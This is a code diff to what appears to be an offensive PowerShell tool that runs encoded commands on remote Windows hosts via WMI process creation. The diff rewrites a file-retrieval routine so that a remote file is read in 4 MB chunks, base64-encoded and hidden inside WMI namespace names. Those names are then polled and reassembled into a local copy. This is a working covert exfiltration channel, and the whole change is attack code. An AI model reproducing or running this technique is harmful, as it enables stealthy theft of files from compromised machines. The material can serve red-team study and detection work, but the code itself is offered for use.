@@ -394,47 +394,120 @@ Param (
     $LocalDestination
 
 ) #End Param
-
-    $remoteScript = @"
-    Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_READY'" | Remove-WmiObject
-    function Insert-Piece(`$i, `$piece) {
-        `$Count = `$i.ToString()
-	    `$Zeros = "0" * (6 - `$Count.Length)
-	    `$Tag = $Tag + `$Zeros + `$Count
-	    `$Piece = `$Tag + `$piece 
-	    `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
-    }
-	`$encFile = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$RemotePath"))
-    `$encFile = `$encFile -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
-    `$nop = [Math]::Floor(`$encFile.Length / 5500)
-    if (`$encFile.Length -gt 5500) {
-        `$lastp = `$encFile.Substring(`$encFile.Length - (`$encFile.Length % 5500), (`$encFile.Length % 5500))
-        `$encFile = `$encFile.Remove(`$encFile.Length - (`$encFile.Length % 5500), (`$encFile.Length % 5500))
+    
+    $RemoteScript = @"
+Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_COMPLETE'" | Remove-WmiObject
+function Insert-Piece(`$i, `$piece) {
+    `$Count = `$i.ToString()
+	`$Zeros = "0" * (6 - `$Count.Length)
+	`$Tag = "$Tag" + `$Zeros + `$Count
+	`$Piece = `$Tag + `$piece 
+	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
+}
+function Insert-EncodedChunk (`$ByteBuffer) {
+    `$EncodedChunk = [Convert]::ToBase64String(`$ByteBuffer)
+    `$WmiEncoded = `$EncodedChunk -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
+    `$nop = [Math]::Floor(`$WmiEncoded.Length / 5500)
+    if (`$WmiEncoded.Length -gt 5500) {
+        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
+        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
         for(`$i = 1; `$i -le `$nop; `$i++) { 
-	        `$piece = `$encFile.Substring(0,5500)
-		    `$encFile = `$encFile.Substring(5500,(`$encFile.Length - 5500))
+	        `$piece = `$WmiEncoded.Substring(0,5500)
+		    `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
 		    Insert-Piece `$i `$piece
         }
-        `$encFile = `$lastp
+        `$WmiEncoded = `$LastPiece
     }
-	Insert-Piece (`$nop + 1) `$encFile 
-	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_READY'}
+    Insert-Piece (`$nop + 1) `$WmiEncoded
+    Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='CHUNK_READY'}
+}
+[UInt64]`$FileOffset = 0
+[UInt64]`$BufferSize = 4 * 1024 * 1024
+`$FileStream = New-Object System.IO.FileStream "$RemotePath",([System.IO.FileMode]::Open)
+`$BytesLeft = `$FileStream.Length
+if (`$FileStream.Length -gt `$BufferSize) {
+    [Byte[]]`$ByteBuffer = New-Object Byte[] `$BufferSize
+    do {
+        `$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
+        `$FileStream.Read(`$ByteBuffer, 0, `$BufferSize) | Out-Null
+        [UInt64]`$FileOffset += `$ByteBuffer.Length
+        `$BytesLeft -= `$ByteBuffer.Length
+        Insert-EncodedChunk `$ByteBuffer
+        `$ChunkDownloaded = ""
+        do {`$ChunkDownloaded = Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like 'CHUNK_DOWNLOADED'"
+        } until (`$ChunkDownloaded)
+        Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
+    } while (`$BytesLeft -gt `$BufferSize)
+}
+`$ByteBuffer = `$null
+[Byte[]]`$ByteBuffer = New-Object Byte[] (`$BytesLeft)
+`$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
+`$FileStream.Read(`$ByteBuffer, 0, `$BytesLeft) | Out-Null
+Insert-EncodedChunk `$ByteBuffer
+`$null = `$FileStream.Flush()
+`$null = `$FileStream.Dispose()
+`$FileStream = `$null
+`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_COMPLETE'}
 "@
-    $scriptBlock = [scriptblock]::Create($remoteScript)
-    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
-    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
+    $ScriptBlock = [ScriptBlock]::Create($RemoteScript)
+    $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock
+    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
 
-    # Wait for script to finish writing file to WMI namespaces
-    $fileReady = ""
-    do{$fileReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'DOWNLOAD_READY'"}
-    until($fileReady)
-    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_READY'" | Remove-WmiObject
-
-    Get-WmiFile -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalDestination
+    $DownloadComplete = ""
+    do {
+        Get-WmiChunk -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalDestination
+        $DownloadComplete = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_COMPLETE'"
+    } until ($DownloadComplete)
 }
 
 function Close-WmiSession {
 
+}
+
+function Get-WmiChunk {
+Param (	
+    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+    [string[]]
+    $ComputerName,
+    
+    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+    [ValidateNotNull()]
+    [System.Management.Automation.PSCredential]
+    [System.Management.Automation.Credential()]
+    $UserName = [System.Management.Automation.PSCredential]::Empty,
+    
+    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+    [string]
+    $Namespace = "root\default",
+    
+    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+    [string]
+    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
+    
+    [Parameter(Mandatory = $True)]
+    [string]$Path
+
+) # End Param
+    
+    $ChunkReady = ""
+    do {$ChunkReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like 'CHUNK_READY'"
+    } until ($ChunkReady)
+    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'" | Remove-WmiObject
+    $GetB64Strings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
+    $null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name="CHUNK_DOWNLOADED"}
+    foreach ($line in $GetB64Strings) {
+	    $CleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
+	    $Reconstructed += $CleanString
+    }
+    if ($Reconstructed.Length % 4 -ne 0) { $Reconstructed += ("===").Substring(0, 4 - ($reconstructed.Length % 4)) }
+    [Byte[]]$DecodedByteArray = [Convert]::FromBase64String($Reconstructed)
+
+    $FileStream = New-Object System.IO.FileStream $Path,([System.IO.FileMode]::Append)
+    $FileStream.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
+    $FileStream.Write($DecodedByteArray, 0, $DecodedByteArray.Length) | Out-Null
+    $FileStream.Flush() | Out-Null
+    $FileStream.Dispose() | Out-Null
+    $FileStream = $null    
 }
 
 function Get-WmiShellOutput{
